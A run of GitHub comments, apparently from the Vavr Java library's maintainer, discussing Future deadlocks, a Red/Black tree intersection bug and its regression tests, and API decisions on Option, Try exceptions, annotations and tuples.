we might want to run the tasks first that where enqueued first (FIFO).. There are some minor changes in here. I will split this PR into smaller ones. However, for now I will go on to do some improvements here (in this PR).\nThis PR goes into 1.0.0. But I think that I'm able to provide a fix that will go into 0.9.2, namely switching to ForkJoinPool.commonPool() and re-implementing a more effective await() + await(timeout, timeunit).\n\nBut now to something completely different. Here is an idea on how to optimize the 'blocking' await() method.\nIn Java there are several Thread states:\n\nImage: \u00a9 by http://uml-diagrams.org, created by Kirill Fakhroutdinov\nI want to investigate if it is possible to put an existing (the current) thread in an 'inactive' state in the way that other threads are allowed to run instead (if they otherwise had to wait until more 'slots' are available in the given context).\nI see the opportunity to use LockSupport#park() for that purpose. Here is my implementation idea:\n\nour FutureImpl gets a new field, a queue of threads that wait for this Future\nthe FutureImpl complete method will execute waitingThreads.forEach(Thread::unpark)\nthe FutureImpl.await() method puts Thread.currentThread() on the waiting queue and parks it (if the Future isn't completed yet)\n\nTechnical details:\n\nwaitingThreads needs to be 'guarded' by the same lock as the other instance variables that are relevant regarding the completion state\nwaitingThreads need only to be unparked if their actual state is 'parked' (aka suspended?)\nmaybe we need to extra-check interrupted conditions (where threads come into play) and act accordingly\n...\n. The park/unpark does not seem to help regarding our problem of deadlocks when executing the FutureTest test suite using ForkJoinPool parallelism=1.\n\nI've implement several await() strategies, namely\n\nusing wait/notify using a monitor\nusing park/unpark\nusing a ManagedBlocker than blocks on a concurrent queue than takes the result\n\nNone of them solves the deadlock problem described above. I tend to use the ManagedBlocker for the final version because this is the way to go in a ForkJoin context. Update: The ManagedBlocker itself does not block the thread. We will use it and internally park/unpark because it is considered fast. CompletableFuture acts the same way.\nObservation: It is interesting that each test runs fine if started as a single test. Only the whole test suite seams to deadlock, even if we do not allow parallel tests (as surefire configuration).\nThe next step I take is to use a custom ForkJoinPool that differs in two aspects from ForkJoinPool.commonPool():\n\nWe will set parallelism to default parallelism + 1.\nWe create a custom thread factory that gives us more control over the threads that are created. Of course we need daemons in order to not block the system shutdown. Most notably we might need to raise the upper bound of threads that exist. Also we need to investigate if we need the original purpose of the ForkJoinPool to have units of work that are forked, wait for results and then joined. Maybe we can relax the behavior here a bit.\n\n. Oh oh! \ud83d\ude31\nOur unit tests contain Futures that block forever. This might be the reason for deadlocks when having parallelism=1 (or=2):\njava\n    @Test\n    public void shouldGetValueOfUncompletedFuture() {\n        final Future<?> future = Future.of(Concurrent::waitForever);\n        assertThat(future.getValue()).isEqualTo(Option.none());\n    }. That's right - it may throw. However, maybe it is an implementation detail and we should fix the API spec for 1.0. I will keep the ticket open.. @mxj4 it can't throw, otherwise the Future invariant does not hold and a bug is revealed. It never threw so far (nor it will). It should not be part of the public API and wil be removed in 1.0.. @mx4j thanks for the feedback. Fixed that in #2093 - see also this description. Thank you, I will review it tomorrow!. Mmhh, sorry. I think it is still possible. The new Future.join is a functional substitute for the imperative Promise. I will take a look!\nSorry for being so slow. There is so much to do - it will take some days until I'm able to check all PRs. Our blog will be deleted on Sep 30th because RedHat stops OpenShift v2. I'm currently creating a new blog on clever-cloud and migrating all the data. In parallel we urgently need a v0.9.2 because some nasty bugs where reported. Also we need to support JDK9. With four kids it is sometimes hard to find enough time beside the daylight job. Sorry for letting you down.\nOne thing about the PR - I need to check how we could integrate the feature with Vavr. I do not want to create new (public visible) types, our goal is to keep the core lib as thin as possible. We will see.... Thx for the kind words. This will be addressed in the upcoming bugfix release 0.9.2.\nWe work on it in Initial Spike to support JDK 9.. I think this might be already fixed with #2102.. Yes, it is already fixed with #2102. Will release it tomorrow as part of Vavr 0.9.2. Thanks for reporting!. First analysis:\nOur algorithm is inspired by/based on: https://github.com/kazu-yamamoto/llrbtree/blob/master/Data/Set/RBTree.hs#L482\nGiven the example, in joinGT we observe:\nbash\nn1: (B:0 (B:-420800448 R:-1) (B:1 R:497885405)), n2: (B:1084073832), h2: 1, n1.blackHeight: 2\nn1: (B:1 R:497885405), n2: (B:1084073832), h2: 1, n1.blackHeight: 1\nn1: (B:-1 R:0), n2: (B:2147483647), h2: 0, n1.blackHeight: 1\nn1: (R:0), n2: (B:2147483647), h2: 0, n1.blackHeight: 1\nwhich means that a RED node with a single value 0 and no children has black hight 1, which is suspicious. I would have expected 0.\nNow the questions are\n1) does the hight calculation fail somewhere?\n2) if yes, where?\nI'm busy tomorrow and will get my hands on it at evening.. Thanks @roberterdin. I will dig out the property checks I once created in order to check the constraints of Red/Black Trees. If we perform operations on random Red/Black Trees, we will se if any other operation suffers from that bug.\nAn easy to implement fix for a 0.9.2 patch release could be to do the intersection by building a new tree using insert operations. This is only for the case we can't fix the algorithm. I also spent some hours and double-checked the original Haskell implementation.\nI added an issue and asked for help checking the counter-example in the Haskell version (see linked issue above).. Thanks Robert! Point 2) is interesting. We should solve it for a neartime 0.9.2 patch release with 3).\nFor 1.0.0 RedBlackTree will be re-implemented with #1535. We will not have any casts between (non-empty) Node and Empty RB-Tree. This will help a lot.. I think difference and intersection are correct. The root of the problem is probably located in tree construction/inserting new nodes. I\u2018ve done more tests and the coloring is suspicious. I will check that.. @roberterdin Nice, thank you! I hope I'm able to do it this evening because I'm on a family trip.. @roberterdin Great finding!! \ud83d\ude03\nPlease find my comments here: roberterdin/vavr@0a564fe. @roberterdin In addition to your solution, please add the following to RedBlackTreeTest.java directly before the line // union():\n``java\n    /*\n     * > let tree1 = fromList [8, 14, 0, 7, 9, 3]\n     * > let tree2 = fromList [7, 9, 14, 6, 0, 5, 11, 10, 4, 12, 8, 13]\n     * > tree1intersectiontree2\n     * Node B 2 (Node B 1 (Node R 1 Leaf 0 Leaf) 7 Leaf) 8 (Node B 1 (Node R 1 Leaf 9 Leaf) 14 Leaf)\n     * > printSet (tree1intersection` tree2)\n     * B 8 (2)\n     * + B 7 (1)\n     *   + R 0 (1)\n     *     +\n     *     +\n     *   +\n     * + B 14 (1)\n     *   + R 9 (1)\n     *     +\n     *     +\n     *   +\n     */\n    @Test\n    public void shouldPassIntersectionRegression1_Issue2098() {\n        final RedBlackTree tree1 = of(8, 14, 0, 7, 9, 3);\n        final RedBlackTree tree2 = of(7, 9, 14, 6, 0, 5, 11, 10, 4, 12, 8, 13);\n        final String actual = tree1.intersection(tree2).toString();\n        final String expected = \"(B:7 B:0 (R:9 B:8 B:14))\"; // TODO: should be \"(B:8 (B:7 R:0) (B:14 R:9))\"\n        assertThat(actual).isEqualTo(expected);\n    }\n/*\n * > let tree1 = fromList [8, 14, 0, 7, 9, 3]\n * > let tree2 = fromList [7, 9, 14, 6, 0, 5, 11, 10, 4, 12, 8, 13]\n * > let tree3 = fromList [1, 2]\n * > (tree1 `intersection` tree2) `intersection` tree3\n * Leaf\n * > tree1 `intersection` (tree2 `intersection` tree3)\n * Leaf\n */\n@Test\npublic void shouldPassIntersectionRegression2_Issue2098() {\n    final RedBlackTree<Integer> tree1 = of(8, 14, 0, 7, 9, 3);\n    final RedBlackTree<Integer> tree2 = of(7, 9, 14, 6, 0, 5, 11, 10, 4, 12, 8, 13);\n    final RedBlackTree<Integer> tree3 = of(1, 2);\n    final RedBlackTree<Integer> actual = tree1.intersection(tree2).intersection(tree3);\n    final RedBlackTree<Integer> expected = tree1.intersection(tree2.intersection(tree3));\n    assertThat(actual).isEqualTo(expected);\n}\n\n/*\n * > let tree1 = [1462193440, 0, 2147483647, -2147483648, 0, 637669539, -1612766076, -1, 1795938819, 1, 0, -420800448, -2147483648, 497885405, 0, 1084073832, 1, 1439964148, 1961646330]\n * > let tree2 = [-1, 1, 2147483647, -1434983536, -2147483648, -1452486079, 1365799971, 231691980, -1780534767, -2147483648, 1448658704, 0, 1526591298]\n * > tree1 `intersection` tree2\n * Node B 2 (Node B 1 (Node R 1 Leaf (-2147483648) Leaf) (-1) Leaf) 0 (Node B 1 (Node R 1 Leaf 1 Leaf) 2147483647 Leaf)\n */\n@Test\npublic void shouldPassIntersectionRegression3_Issue2098() {\n    final RedBlackTree<Integer> tree1 = of(1462193440, 0, 2147483647, -2147483648, 0, 637669539, -1612766076, -1, 1795938819, 1, 0, -420800448, -2147483648, 497885405, 0, 1084073832, 1, 1439964148, 1961646330);\n    final RedBlackTree<Integer> tree2 = of(-1, 1, 2147483647, -1434983536, -2147483648, -1452486079, 1365799971, 231691980, -1780534767, -2147483648, 1448658704, 0, 1526591298);\n    final String actual = tree1.intersection(tree2).toString();\n    final String expected = \"(B:-1 B:-2147483648 (R:1 B:0 B:2147483647))\"; // TODO: should be \"(B:0 (B:-1 R:-2147483648) (B:2147483647 R:1))\"\n    assertThat(actual).isEqualTo(expected);\n}\n\n```. @roberterdin nice! yes, thx, it is a typo. I corrected it in the comment above.\n. Thanks!\nI don't think we need a special construct. It is already all there.\nWhy not just use the following?\nTry.of(() -> Option.ofOptional(retrieve(id).map(Processor::process)))\n. Yes, you are right, I've overseen that.\nWhat we need is Option.mapTry (and Option.flatMapTry):\njava\nTry.of(() -> retrieve(id)).map(o -> Option.ofOptional(o).mapTry(this::process));\nwith\njava\ninterface Option<T> {\n    default <U> Option<U> mapTry(CheckedFunction1<? super T, ? extends U> mapper) {\n        if (isEmpty()) {\n            return Option.none();\n        } else {\n            try {\n                return Option.of(mapper.apply(get()));\n            } catch(Throwable x) {\n                return Option.none();\n            }\n        }\n    }\n}\nNote: Option.mapTry, flatMapTry need to return Option instead of Try in order to compose nicely with nested map, flatMap calls.. @skestle I always think about how I can reduce Vavr, not how I can add more. I do not want to add new types for every new use-case. The existing abstractions should be powerful enough to achieve the desired by composition.\nWhat's wrong with\njava\nTry.of(() -> retrieve(id))\n   .map(o -> Option.ofOptional(o)\n                   .mapTry(Processor::process));\n~~I think it fits your use-case. Especially no Success<Some<T>> is mapped to Success<None<U>>.~~\nUpdate: Sorry, I'm on a mobile phone only - of course there might be a Some<None<U>> above...\nThis would be better:\njava\nTry.of(() -> retrieve(id))\n   .map(o -> Option.ofOptional(o)\n                   .mapOrThrow(Processor::process));. @skestle I've thought about it again. There must be a good reason to introduce new API because of the cost/benefit ratio.\nWe need clear entry/exit points between the standard Java API and the Vavr API. Leaking special standard Java API handling into the broad will unnecessarily complicate things and it does not scale well. There will be more questions like this to handle special cases and provide syntactic sugar. That is not the way it is supposed to be. We need a thin API (= few 'words') that is deep (= compositional).\nOptional is designed to be used in conjunction with if. Therefore I suggest to use this solution to your problem:\njava\n// Try<Option<R>>\nTry.of(() -> retrieve(id)).mapTry(o -> o.isPresent() ? some(process(o.get())) : none());\nI will close this issue (and my pull request #2101) and really hope you understand my decision.\n@SimY4 Currently it is too much. Before adding more and more features in the broad I want to finish the 1.0.0 release. After that we can see if and how it fits into the library (in the presence of modules).. Thanks! Looks like 0.9.2 will appear soon.... @KTannenberg yes, that is important. I will consider that!. @skestle you may review it.... (Note: #1994 is still important for 1.0.0 /cc @kittylyst). Awesome, thanks!. Just realized that the build is broken for jdk9 (you told me already). It does not matter - I will fix that tomorrow. Thx!. This test already works as expected with Vavr 0.9.2:\n```java\npublic class Xyz {\npublic static void main(String[] args) throws Exception {\n\n    final CompletableFuture<Integer> javaFuture = CompletableFuture.supplyAsync(() -> {\n        try {\n            Thread.sleep(3000);\n            return 1;\n        } catch (InterruptedException e) {\n            return 0;\n        }\n    });\n\n    final Future<String> vavrFuture = Future.fromCompletableFuture(javaFuture).map(String::valueOf);\n\n    System.out.println(vavrFuture);\n\n    vavrFuture.forEach(System.out::println);\n\n    Thread.sleep(5000);\n\n    System.exit(0);\n\n}\n\n}\n```\nConsole output:\nFuture(?)\n1\n. There is no specification, yet.. Out-of-scope.. For Eclipse plugins there are custom update sites, listed on Eclipse Marketplace. For IntelliJ it seems that they host plugins by themselves.\nGenerally, it would be nice to have a generic way to spot immutable types, no matter if they are Vavr specific. There already exist annotations introduced by @briangoetz in his JCIP book.\nWe already use our own internal annotation GuardedBy. There exists an issue for introducing @NotNull and @Nullable annotations. Additionally we have multiple package private @GwtIncompatible annotations.\nIntelliJ IDEA already supports the JCIP annotations. I think the easiest way to solve this issue is to enhance the existing IntelliJ support for JCIP annotations in the way that calling a write operation on an immutable object without an assignment shows up a warning (or an error).\nAn operation is a write operation, if it does return the self-type. However, this will not cover all cases. E.g. there are transformational operations like zip or groupBy that do return other types than the self type.\nHere, we could add a package io.vavr.annotation that will house all of our annotations. Currently I see only (a subset of) the JCIP annotations there, plus NotNull, Nullable and maybe GwtIncompatible (I'm not sure if it should be exposed to the outside).\nWe need a volunteer that creates an IntelliJ IDEA issue and keeps track of it.\n. @nfekete Indeed, that would help. I think it would be best to create a dedicated io.vavr.annotation module.\nThen we could include the annotation module as compile-time dependency. I don't know if that would work with @GwtIncompatible or when the compiler performs checks for a project that has Vavr as transitive dependency. Does such a project then need to include the Vavr annotations by itself as compile time dependency?. > but the nullness part is much more work.\nYes. We should only do that for public API of course and not the internal classes like io.vavr.collection.Collections. I'm sure it will reveal some methods where the javadoc isn't perfect, yet. I.e. cases where we forgot to add @throws documentation.. @atsu85 this is more than the addition of a compile-time check 'feature', it is a strategic decision for the Vavr project.\nI totally agree to @lukaseder. He stated here in a similar question:\n\nThis is important to realise. You cannot possibly think that engaging in a \"parallel universe\" type system involving type annotations is a simple task, or that you will stop at abusing that language feature for \"just some simple\" null checks. At some point, you will want to annotate collection emptiness, string \"size-ness\", number \"positive-ness\", \"single-stream-consumption-ness\" etc., so this is a very strategic decision that must not be underestimated (at least in a cleanly designed, not so wishy-washy API).\n\nCurrently we have @GwtIncompatible annotations. We should have never introduced them. I wait for the moment we are able to remove them completely.\nI will clarify the (non-)usage of annotations in our contribution guidelines.\nKeep it simple!. I see the usefulness but I see also the drawbacks\n\nwe bind to specific tooling\nit is error-prone regarding further development and maintenance\n...\n\nI don't want to maintain code like this:\njava\ninterface Future<T> {\n    @GwtIncompatible\n    @CheckReturnValue\n    <U> Future<U> map(@NotNull Function<? super T, ? extends U> mapper);\n}\nA bit later it might look like this (because we don't have any arguments to reject other checks):\njava\n@Async\n@Sealed\n@SumType\ninterface Future<T> {\n    @GwtIncompatible\n    @CheckReturnValue\n    @NotSameInstance\n    @Async\n    <U> Future<U> map(@NotNull @Idempotent @Memoizable Function<? super T, ? extends U> mapper);\n}\nAnnotations are a workaround for an incomplete type system. I want to use clean and straight forward code instead of workarounds.. @briangoetz thank you for your comment, it always helps me to round the picture\n\nand therefore any inheritance semantics are completely tool-specific\n\nyes, in my random example that would apply to a @Sealed interface\nI've learned that we should not try to 'emulate' non-existing Java features, like type-constructors, pattern matching or for-comprehensions.\nInterestingly, as Vavr gets more popular, I feel increasingly responsible in how it influences the Java ecosystem.\nMy thoughts are about how I can reduce features, intra-library dependencies and redundancies while generalizing things and increasing composability at the same time. Modularization will be a key aspect here.\nLess is more and simplicity is king.\nAnnotations have their limitations.\nFor example both R f(@Nullable Option<T> o) and R f(@NotNull Option<T> o) are curious.\nAlso we can't express if T and R of Function<T, R> are @Nullable or not.\n(Update: actually the latter is possible but there is/was a bug)\nI think: if in doubt, leave the feature away.\n. \ud83e\udd54\ud83c\udf45\ud83e\udd5a\ud83c\udf46\ud83e\udd54\ud83c\udf45\ud83e\udd5a\ud83c\udf46\ud83e\udd54\ud83c\udf45\ud83e\udd5a\ud83c\udf46\ud83e\udd54\ud83c\udf45\ud83e\udd5a\ud83c\udf46\n\nI'm not sure what you mean.\n\nR f(@NotNull Option<T> o) is semantically curious because Option is a wrapper for null.\n\nNote that you are actually checking against null in pretty much every vavr method\n\nYes, I decided that in order to provide human-readable error messages. Even if we had annotations, no one forces a developer to use the tooling. Also, if lib X uses Vavr and X.map(f) calls some of Vavr's map(f), f could be still null.\n\nI usually declare non-nullness on a package level (...)\n\nWhy not forbid to pass around null at all? Not using null at all is the safest way to handle it and has the lowest cost.\n\ud83e\udd54\ud83c\udf45\ud83e\udd5a\ud83c\udf46\ud83e\udd54\ud83c\udf45\ud83e\udd5a\ud83c\udf46\ud83e\udd54\ud83c\udf45\ud83e\udd5a\ud83c\udf46\ud83e\udd54\ud83c\udf45\ud83e\udd5a\ud83c\udf46\n  . @lukaseder \n\nEver heard of JSR-308?\n\nYes, but I must admit that I was not aware of the fact that generic type parameters are annotatable. I try to avoid annotation processing if possible. Vavr uses it here but it caused problems in the past regarding IDE integration, Java 9 modules, build processes etc.\n. @lukaseder \n\n. Yep, @nfekete is right. Try can't catch an exception that thrown outside of the context of Try, i.e. before the JVM calls Try.run. Defer the exception by using a function instead.. Oh, I forgot - we have a new 'boy scout rule #1': We add usage examples to the javadoc \ud83d\ude05\nPlease add\njava\n<pre>{@code\n// = (1 (2 4 5) 3)\nTree.recurse(1, i ->\n    (i == 1) ? List.of(2, 3) :\n    (i == 2) ? List.(4, 5) : List.empty()\n).toLispString();\n}</pre>\n. Great thank you!\nThe order is ok, for now it is sufficient, if the new methods are located in the static method block. We do not have alphabetic order in other classes. Anyway, for Vavr 1.0.0 I will 'clean up' all classes.. I like that idea! Could you please provide an example (input, application, output)?\nI think we need a new name for the method, maybe also recurse or build or ??? (see #2125). @valery1707 Great, thank you!\nThe menu items may be iterated in arbitrary order when building the tree. What is the overall complexity of build such a tree when n is the number of menu items?\nNaively I would say it is O(n * log n), because we iterate n MenuItems, search the parent in O(log n) and insert the new node in O(1) and rebuild the tree in O(log n) (or eff. O(1)? - which would be the same in O notion).\nOr does your implementation require O(n) because it uses the recursion? But then I think the flat items need to have a specific order, right?. Thx! (Patch release 0.9.2 is nearly finished). Our Future implementation will be dropped. There will be no Vavr 1.0 module vavr-concurrent.\nReason: Implementing our own concurrency library is too error-prone, concurrency is a hard problem. There are many(!) alternatives, first of all Java's native CompletableFuture. @florian-stefan Great, than let's take that. Are you volunteering to solve this issue? \ud83d\ude1c. Awesome :) Take your time!. > This seems to be a flickering test. Is there a way to restart the affected build job without using a dummy commit?\nWe will fix that Java 9 build soon - it does not matter for now.. @valery1707 ping.... Hi @valery1707, thank you for applying the changes! We don\u2018t have any time pressure, so I don\u2018t mind about delays. In fact I\u2018m also delaying things \ud83d\ude48\nThe history is clean, I always make squash pulls instead of merge pulls.\nThx!. Hi @valery1707, please rebase your branch on the current vavr-io master branch. I fixed the unit test that fails.... Great, thank you - I'm on it (JDK9 build). @roberterdin please don't mind, the JDK8 build is perfectly ok. We have some non-deterministic behavior regarding our JDK9 build. This is an open issue. I will merge your changes now.. @chb0github Ha, yes \ud83d\ude04 We did not automate them, in fact it is currently hard manual work, depending on the release type. Basically, it is described in out contribution guidelines.\nWe currently do not work on multiple branches for different versions. Instead we tag the releases (as usual) and cherry pick commits for the next patch release.\nI don't know if it is possible to release to Sonatype in an automated way. We need to GPG-sign the artifacts. However, there are other possibilities than publishing artifacts to Maven Central, e.g. JFrog Bintray. The changelog creation could be automated, but writing it by hand is way better.. @Sir4ur0n Great suggestion, thank you. We should add the following, more general methods to Traversable:\n```java\nTraversable replace(Predicate<? super T> predicate, Function<? super T, ? extends T> mapper);\nTraversable replaceAll(Predicate<? super T> predicate, Function<? super T, ? extends T> mapper);\n```\nNote: I'm not sure if the existing methods break the Liskov Substitution Principle because SortedSet for example uses the underlying Comparator (instead of equals(obj)) to check object equality when calling replace/replaceAll.\n\nJava's TreeSet uses equals under the hood when calling remove(obj)\nScala's TreeSet uses the underlying Comparator when calling the - method:\n\n```scala\nscala> import scala.collection.immutable.\nimport scala.collection.immutable.\nscala> val set = TreeSet(1, 2, 3)((i,j) => i - j)\nset: scala.collection.immutable.TreeSet[Int] = TreeSet(1, 2, 3)\nscala> set - 1\nres3: scala.collection.immutable.TreeSet[Int] = TreeSet(2, 3)\nscala> val set = TreeSet(1, 2, 3)((i,j) => -1)\nset: scala.collection.immutable.TreeSet[Int] = TreeSet(3, 2, 1)\nscala> set - 1\nres4: scala.collection.immutable.TreeSet[Int] = TreeSet(3, 2, 1)\n```\nHowever, Scala's TreeSet#- method isn't an overload, e.g. List does not have it (see this).\nSo, regarding LSP, I'm not sure if we also should unify that behavior or leave it this way.\nI think is that we should leave it that way and clarify the behavior in the Javadoc. Element equality is defined by the collection type, depending on whether the collection isOrdered() == true, i.e. it has an underlying Comparator.. @nfekete Good point! I've overseen that.\n@Sir4ur0n N\u00e1ndor is right, replaceAll does not add significant benefit compared to the existing map. The opposite is true: functions that take two or more function arguments are considered to be \"bad practice\" (can't find the original cite by Martin Odersky right now).\n```java\nts.replaceAll(t -> condition(t), t -> mapped(t));\nts.map(t -> condition(t) ? mapped(t) : t);\n```\nExpressing replace(Predicate, Function) is not that easy:\njava\nts.find(t -> condition(t)).map(t -> ts.replace(t, mapped(t))).getOrElse(ts);\nBut without having a real-world use-case, we should not add additional API.. @CauchyPeano yes, right\n\nBut without having a real-world use-case, we should not add additional API.\n\nI will close the ticket!. I think this might work for major releases, but not for minor or patch releases.\nIt might also work for them but we need to change the branching model.\nI'm open for discussion here. Please keep in mind that Vavr 1.0.0 will be based on Gradle builds, not on Maven builds.\n(I intentionally marked this issue as 'strategic' because we do not necessarily resolve it for 1.0.0). Out-of-scope for us. We have a relatively low release frequency. Semantic versioning/checking backward source/binary compatibility has to be done manually.. @kant111 @KTannenberg @chb0github @mrpotes Thank you for the great discussion. I decided not to use a generic type parameter for the exception type mainly for one reason:\nFor simple cases it might work well but in general a call might throw multiple exception, like InterruptedException and IOException at the same time. We are not able to define a common exception in a practicable way using Java's type system - we will always end up with Throwable.\nIn fact Java is one of the rare languages that have checked exception, most language do not and it is generally seen as a error in language design - at least it is controversial discussed.\nUsing Try, we are aware about the presence of exceptions. There are many useful methods to handle such cases - recently I added more onFailure variants. I think the current approach is sufficient. Also I think having only one specific exception type is not sufficient.\nI like this discussion (and hope it goes on) but I will close this ticket because we will not change the way we use exception types.. @kant111 \n1) Try can catch more than more type - specifying one type is not sufficient / it is useless. Here is an example where the most common type is Exception\n```java\nimport io.vavr.control.Try;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.concurrent.*;\nimport static io.vavr.API.println;\npublic class Test {\npublic static void main(String[] args) {\n\n    final ExecutorService executorService = ForkJoinPool.commonPool();\n    final List<Callable<String>> myTasks = Arrays.asList(\n            () -> \"Ok!\",\n            () -> { throw new Error(\"Meep!\");\n    });\n\n    { // Java variant 1\n        List<Future<String>> res = null;\n        try {\n            res = executorService.invokeAll(myTasks);\n        } catch (InterruptedException | NullPointerException | RejectedExecutionException e) {\n            // e is of type Exception\n            if (e instanceof InterruptedException) {\n                System.out.println(\"InterruptedException: \" + e);\n            }\n            if (e instanceof NullPointerException) {\n                System.out.println(\"NullPointerException: \" + e);\n            }\n            if (e instanceof RejectedExecutionException) {\n                System.out.println(\"RejectedExecutionException: \" + e);\n            }\n        }\n        if (res != null) {\n            System.out.println(\"Success\");\n        }\n    }\n\n    { // Java variant 2\n        List<Future<String>> res = null;\n        try {\n            res = executorService.invokeAll(myTasks);\n        } catch (InterruptedException e) {\n            System.out.println(\"InterruptedException: \" + e);\n        } catch (NullPointerException e) {\n            System.out.println(\"NullPointerException: \" + e);\n        } catch (RejectedExecutionException e) {\n            System.out.println(\"RejectedExecutionException: \" + e);\n        }\n        if (res != null) {\n            System.out.println(\"Success\");\n        }\n    }\n\n    { // Vavr\n        Try.of(() -> executorService.invokeAll(myTasks))\n                .onFailure(InterruptedException.class, e -> println(\"InterruptedException: \" + e))\n                .onFailure(NullPointerException.class, e -> println(\"NullPointerException: \" + e))\n                .onFailure(RejectedExecutionException.class, e -> println(\"RejectedExecutionException: \" + e))\n                .onSuccess(res -> println(\"Success!\"));\n    }\n}\n\n}\n```\n2) @chb0github You argue about some kind of convention. I agree that Error should not be catched, but in practice 3rd party libs extend Error where it is really an Exception. There are tons of examples, e.g. in Calypso - an important trading system that exists since the 90s. But there are tons of other examples.\n3) Please note that we define Errors that are not recoverable. E.g. Try rethrows OutOfMemory exceptions (beside others)\nI understand your thoughts but as I said - we will keep it as-is. As always: if in doubt, align to Scala. This is our design premise.\n. Hi @nfekete, thank you for the nice evening-read \ud83d\ude04\nYou made good points. Especially I like the separation of concerns of regarding the functional interfaces and the sum types like Try.\nI think it is a good idea to ignore the rare cases where 3rd party library implementors made horrible design decisions by using sub-classes of Error as non-fatal exceptions.\nThx for being determined in this case!. The whole project is based on contributions. The changes might look small but the effort in terms of thoughts are huge. This kind of energy doesn't get lost - it makes the library useful and also simple I think.. So... there still seem to be unclarity.\nI want to showcase different scenarios in order to show that it is not a good idea to...\n1) Catch a specific exception type like \"the other functional library Abc...\"\n(Look at FAIL! comments)\n\n2) Just catch Exception and rethrow remaining throwables wrapped as RuntimeException\nI understand that we could ignore Errors in the type signature because they are treated as unchecked exceptions and catched automatically by Try (if not considered fatal).\nBut let me be clear, there do not only exist Error and Exception as subclasses of Throwable.\n\ud83e\udd1c\ud83c\udffc\ud83d\udca5 JAVA DOES ALLOW SUBCLASSES OF THROWABLE \ud83d\udca5\ud83e\udd1b\ud83c\udffc\n```java\n// Someone thought it is a good idea to build a distinct sub-tree of business exceptions\nclass MyDistinctBusinessException extends Throwable {\n}\n// Someone thought it is a good idea to build a distinct sub-tree of internal errors\nclass MyDistinctInternalException extends Throwable {\n}\n```\nI know that it isn't good practice to extend Throwable but it is possible and therefore it happens.\nWe gain nothing by handling only Exception on our type signatures. The developer has to make instanceof checks nonetheless. You are still able just to use one of:\n```java\nTry#recover(Class exceptionType, CheckedFunction<? super X, ? extends T> recoveryFunction)\nTry#recoverWith(Class exceptionType, CheckedFunction<? super X, ? extends Try<? extends T>> recoveryFunction))\n```\nMaybe there will be also a\njava\nTry#onFailure(Class<X> exceptionType, Consumer<? super X> action)\nwhere X extends Throwable.\nWhen using Try, it should not make any difference for you:\n\nRecover the exceptions you expect\nHandle all remaining (technical exception) by logging them. You have to! Or do you want to just ignore any unexpected RuntimeExceptions?\n\n\nPlease don't miss that io.vavr.CheckedFunction0..8 will throw Exception (not Throwable)!\nYou can use these CheckedFunctions outside of the context of Try.\n\n@feliksik \n\nand that it's up to the client application to fix this by pushing the Throwable back into a more constrained type\n\nPlease give me an example. Where do you need to push the Throwable back into a more constrained type? The 'recover' methods will be able to give you the expected exception type (see above).. @feliksik thank you for the example!\nVavr 1.0 will wrap the original exception in a NonFatalException (which extends RuntimeException).\nSee source.\n(Don't get irritated because of the @Deprecated annotation. That is still in the flow/work in progress.). Thank you for your suggestion. We will keep it this way, see this comment.. Vavr's values, i.e. 'data holders' are stateless and immutable. This manifests by having only final instance variables.\nNote: there are exceptions, like Future, Iterator, Lazy and Stream. These are stateful.\n```java\npublic class SomeValue {\n// most of the time private, in the case of tuples instance variables are public\nfinal T abc;\n\n// Vavr's constructors are not directly called\nprivate SomeValue(T abc) {\n    this.abc = abc;\n}\n\n// instead we use factory methods, often more than only one\npublic static <T> SomeValue<T> of(T abc) {\n    return new SomeValue(abc);\n}\n\n}\n```\nGiven that we are not able to follow DTO or Bean conventions:\n\nhaving setters would imply to have non-final instance variables, which is a no-go for Vavr\nhaving a default constructor would also imply to have non-final instance vars (see above)\n\nNamely, we could only have getters. But they do not make any sense, we would only have them because some Java developers feel more comfortable with the name 'get'.\nWe are intentionally breaking these old structures. However, when Java evolves (e.g. by introducing value types / data types), we will align Vavr to Java and benefit from these types. Tuples may then look like this:\njava\ndata class Tuple1<T1>(T1 t1) {}\ndata class Tuple2<T1, T2>(T1 t1, T2 t2) {}\ndata class Tuple3<T1, T2, T3>(T1 t1, T2 t2, T3 t3) {}\n// ...\nI hope you understand my points. I will close this question now (and your follow up #2140).. I think 0.9.1 does not work well with Java 9, see #2102 and #2097 for example.\nWe did not test 0.9.1 with Java 9, JDK9 wasn't released to that time - but 0.9.2 will be Java 9 compatible (both as dependency and build from source with JDK9).\n. Emmanuel, I will close this as duplicate to #2097 - thanks for reporting!. Tuples are special Records, both are product types. A heterogenous list (short: HList) is a recursive declaration of a Tuple.\nWe thought about HList but it isn't practicable.\nRecord types for Scala are currently researched.\nOur Tuples have accessors and 'functional setters':\n\npublic final fields _1, _2, ... - this is the idiomatic way to access tuple values\n\njava\nK key = entry._1;\n\nmethods _1(), _2(), ... - this is the idiomatic way to access values using method references\n\njava\nSeq<K> keys = myMap.values().map(entry::_1);\n\n\nupdate1(T1), update2(T2), ... - to replace by element of same type\n\n\nmap1(Function), map2(Function), ... - to replace by element of different type\n\n\n\nAs @alwins0n already said, we intentionally aligned to Scala here. When introducing getters, someone will ask for setters (instead of update*). Then the purely functional political party will say that setters imply mutable state.\nI think the idea of classical Java beans does not fit well here. Beans (aka DTOs) need a no-arg constructor, getters and setters, in order to be useful (e.g. for automatic marshalling/unmarshalling). We intentionally do want to stand apart from this.\nI do not want to invent s.th. new here, it is our premise to align to Scala, especially when in doubt. Talking about names directs us to nowhere. There are too many opposing opinions, it is impossible to find consensus.\n. Closed for the same reason as #2138 (see my comment).. A similar issue has been reported recently by @szarnekow: https://gitter.im/vavr-io/vavr?at=59d4e81b01110b723176edde\nI was not able to reproduce it on my Mac. One of my next steps towards Vavr 1.0.0 is\n\nthe move to Gradle builds\nand with that, not using the scala-maven-plugin anymore (if possible)\n. @tmtron\n\n\nBut a test fails - not sure if this is now a result of the different scala version or a real issue.\n\nWe already fixed that test, please git pull and/or rebase your branch.. I know, this is really a pain in the ass in Java but adding overloads (and primitive specializations in general) isn't a viable solution for us.\nWith primitive generics all will be fine (fingers crossed).. @kant111, @hamnis \n\nCan you describe why it isn't a viable solution ?\n\nMaybe I was too fast closing the issue. I don't like to add special cases for void or primitive types. It will blow up the API unnecessarily. Especially it seems odd to recover literally nothing.\nWhat do you all think about the following?\njava\n    default <X extends Throwable> Try<T> onFailure(Class<X> exception, Consumer<? super X> action) {\n        Objects.requireNonNull(exception, \"exception is null\");\n        Objects.requireNonNull(action, \"action is null\");\n        if (isFailure() && exception.isAssignableFrom(getCause().getClass())) {\n            action.accept((X) getCause());\n        }\n        return this;\n    }\n\nIt is more general than 